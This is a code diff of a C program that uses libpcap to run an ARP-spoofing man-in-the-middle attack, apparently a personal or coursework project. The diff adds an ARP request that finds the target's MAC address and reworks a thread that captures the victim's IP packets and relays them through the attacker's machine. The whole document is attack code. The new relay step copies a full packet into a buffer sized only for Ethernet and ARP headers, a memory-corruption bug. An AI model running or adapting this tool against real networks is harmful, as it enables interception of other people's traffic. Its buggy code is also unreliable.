@@ -74,6 +74,7 @@ struct Attack_packet{
 
     u_int8_t attacker_Mac[6];
     u_int8_t sender_Mac[6];
+    u_int8_t target_Mac[6];
 };
 
 void *Send_Arp_packet(void *attack);
@@ -92,10 +93,12 @@ int main(int argc, char *argv[]){
     const u_char* rev_packet;
     u_int32_t target;
     pcap_t *handle;
-    u_char *Arp_packet;
+    u_char *Arp_packet, *packet_target;
     int res;
     pthread_t thr1, thr2;
     struct Attack_packet attack;
+    u_int8_t target_Mac[6];
+    u_int8_t attacker_Mac[6];
     ////////////////////////////////////
     ///////Variable For Getting Mac/////
     ////////////////////////////////////
@@ -126,6 +129,7 @@ int main(int argc, char *argv[]){
     if( ioctl(fd, SIOCGIFHWADDR, &s) == 0){
         int i;
         for(i=0; i<6; i++){
+            attacker_Mac[i] =  s.ifr_addr.sa_data[i];
             ethernet->Source_Mac[i] = s.ifr_addr.sa_data[i];
             arp->Sender_Mac[i] = s.ifr_addr.sa_data[i];
             attack.attacker_Mac[i] = s.ifr_addr.sa_data[i];
@@ -214,7 +218,56 @@ int main(int argc, char *argv[]){
 
     memcpy(Arp_packet,ethernet, sizeof(*ethernet));
     memcpy(Arp_packet+(sizeof(*ethernet)), arp, sizeof(*arp));
+    ////////////////////////////////////////////////////////////
+    /////////////////Getting Target's Mac Add///////////////////
+    ////////////////////////////////////////////////////////////
+    for(i=0; i<6; i++){
+        ethernet->Destination_Mac[i] = 0xff;
+        ethernet->Source_Mac[i] = attacker_Mac[i];
+        arp->Sender_Mac[i] = attacker_Mac[i];
+        target_Mac[i] = 0x00;
 
+    }
+
+    ethernet->Ether_Type = 0x0608;
+    arp->Mac_Type = 0x0100;
+    arp->IP_Type = 0x0008;
+    arp->Mac_Add_Len = 0x06;
+    arp->IP_Add_Len = 0x04;
+    arp->Opcode = 0x0100;
+    arp->Sender_IP.s_addr = attacker;
+    arp->Target_IP.s_addr = target;
+
+    packet_target = (u_int8_t *)malloc(sizeof(*ethernet)+sizeof(*arp));
+    memcpy(packet_target,ethernet, sizeof(*ethernet));
+    memcpy(packet_target+(sizeof(*ethernet)), arp, sizeof(*arp));
+
+
+
+    pcap_sendpacket(handle, packet_target, sizeof(*ethernet)+sizeof(*arp));
+
+    while(1){
+        res=pcap_next_ex(handle, &header, &rev_packet);
+        if(res == 0){
+            continue;
+        }
+        else if(res == -1 || res == -2){
+            printf("res = -1 or -2 \n");
+            break;
+        }else{
+            temp_ethernet = (struct ETHERNET_HEADER *)(rev_packet);
+            temp_arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
+            if(temp_arp->Opcode == 512){
+                for(i=0; i<6; i++){
+                    target_Mac[i] = temp_ethernet->Source_Mac[i];
+                    attack.target_Mac[i] = temp_ethernet->Source_Mac[i];
+                }
+                printf("Found Target's Mac add..!!\n");
+                break;
+            }
+        }
+
+    }
     ////////////////////////////////////////////////////////////
     ////////////Sending Infected Packet Thread//////////////////
     ////////////////////////////////////////////////////////////
@@ -223,6 +276,7 @@ int main(int argc, char *argv[]){
     attack.attacker.s_addr = attacker;
     attack.sender.s_addr = sender;
     attack.target.s_addr = target;
+
 
     pthread_create(&thr1, NULL, Send_Arp_packet, (void*)&attack);
     pthread_create(&thr2, NULL, GetTarget_MacSniffing, (void*)&attack);
@@ -251,74 +305,18 @@ void *GetTarget_MacSniffing(void *attack){
     struct pcap_pkthdr *header;
     const u_char* rev_packet;
     u_char* packet_target;
-    struct ETHERNET_HEADER *ethernet, *temp_ethernet;
-    struct ARP_HEADER *arp, *temp_arp;
+    struct ETHERNET_HEADER *ethernet;
+    struct ARP_HEADER *arp;
     struct IP_HEADER *ip;
-    struct TCP_HEADER *tcp;
-    struct ICMP_HEADER *icmp;
-    char *data;
-    int size_ip, size_tcp, size_icmp;
-    int total_len_ip;
-    int total_len_tcp;
-    int total_len_icmp;
-    u_int8_t Target_Mac[6];
+
+
+
+    u_int16_t total_len_ip;
 
     ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
     arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
     ip = (struct IP_HEADER *)malloc(sizeof(struct IP_HEADER));
-    tcp = (struct TCP_HEADER *)malloc(sizeof(struct TCP_HEADER));
-    icmp = (struct ICMP_HEADER *)malloc(sizeof(struct ICMP_HEADER));
 
-    temp_ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
-    temp_arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
-    ////////////////////////////////////////////////////////////
-    /////////////////Getting Target's Mac Add///////////////////
-    ////////////////////////////////////////////////////////////
-    for(i=0; i<6; i++){
-        ethernet->Destination_Mac[i] = 0xff;
-        ethernet->Source_Mac[i] = attack_packet->attacker_Mac[i];
-        arp->Sender_Mac[i] = attack_packet->attacker_Mac[i];
-        arp->Target_Mac[i] = 0x00;
-    }
-
-    ethernet->Ether_Type = 0x0608;
-    arp->Mac_Type = 0x0100;
-    arp->IP_Type = 0x0008;
-    arp->Mac_Add_Len = 0x06;
-    arp->IP_Add_Len = 0x04;
-    arp->Opcode = 0x0100;
-    arp->Sender_IP = attack_packet->attacker;
-    arp->Target_IP = attack_packet->target;
-
-    packet_target = (u_int8_t *)malloc(sizeof(*ethernet)+sizeof(*arp));
-    memcpy(packet_target,ethernet, sizeof(*ethernet));
-    memcpy(packet_target+(sizeof(*ethernet)), arp, sizeof(*arp));
-
-
-
-    pcap_sendpacket(handle, packet_target, sizeof(*ethernet)+sizeof(*arp));
-
-    while(1){
-        res=pcap_next_ex(handle, &header, &rev_packet);
-        if(res == 0){
-            continue;
-        }
-        else if(res == -1 || res == -2){
-            printf("res = -1 or -2 \n");
-            break;
-        }else{
-            temp_ethernet = (struct ETHERNET_HEADER *)(rev_packet);
-            temp_arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
-            if(temp_arp->Opcode == 512){
-                for(i=0; i<6; i++){
-                    Target_Mac[i] = temp_ethernet->Source_Mac[i];
-                }
-                printf("Found Target's Mac add..!!\n");
-                break;
-            }
-        }
-
-    }
     ////////////////////////////////////////////////////////////
     /////////////////Catching Sender's Packet///////////////////
     ////////////////////////////////////////////////////////////
@@ -333,14 +331,10 @@ void *GetTarget_MacSniffing(void *attack){
             break;
         }else{
             ethernet = (struct ETHERNET_HEADER *)(rev_packet);
-            printf("Compare Ether_Type!!\n");
-
-            printf("%02x\n", ethernet->Ether_Type);
             if(htons(ethernet->Ether_Type) != ETHERTYPE_IP){
                 printf("This packet is not ip packet!!\n");
                 continue;
             }else{
-                printf("Compare Sender's Mac add\n");
                 for(i=0; i<6; i++){
                     check = 0;
                     if(ethernet->Source_Mac[i] != attack_packet ->sender_Mac[i]){
@@ -350,26 +344,19 @@ void *GetTarget_MacSniffing(void *attack){
                 }
                 if(check == 0){
                     printf("Start Make Packet\n");
+
+
                     for(i=0; i<6; i++){
                         ethernet->Source_Mac[i] = attack_packet->attacker_Mac[i];
-                        ethernet->Destination_Mac[i] = Target_Mac[i];
+                        ethernet->Destination_Mac[i] = attack_packet->target_Mac[i];
                     }
                     ip = (struct IP_HEADER *)(rev_packet+ETHERNET_SIZE);
-                    size_ip = (ip->verNlen & 0xf)*4;
-                    total_len_ip = ETHERNET_SIZE + size_ip;
-                    icmp = (struct ICMP_HEADER *)(rev_packet+total_len_ip);
-                    icmp->Checksum = icmp->Checksum + 0x08;
-                    size_icmp = 2;
-                    total_len_icmp = total_len_ip + size_icmp;
-                    data = (char *)(rev_packet+total_len_icmp);
+                    total_len_ip = ntohs(ip->Total_Len);
 
-                    memcpy(packet_target, ethernet, sizeof(*ethernet));
-                    memcpy(packet_target+ETHERNET_SIZE, ip, size_ip);
-                    memcpy(packet_target+total_len_ip, tcp, size_icmp);
-                    memcpy(packet_target+total_len_icmp, data, ntohs(ip->Total_Len)+ETHERNET_SIZE-total_len_icmp);
+                    packet_target = (u_int8_t *)malloc(sizeof(*ethernet)+sizeof(*arp));
+                    memcpy(packet_target, rev_packet, total_len_ip+ETHERNET_SIZE);
 
-                    printf("please : %d\n",pcap_sendpacket(handle, packet_target, ntohs(ip->Total_Len)+ETHERNET_SIZE));
-                    printf("please : %d\n",pcap_sendpacket(handle, packet_target, ntohs(ip->Total_Len)+ETHERNET_SIZE));
+                    pcap_sendpacket(handle, packet_target, total_len_ip+ETHERNET_SIZE);
                     printf("Attack Finished..!\n");
                 }
             }
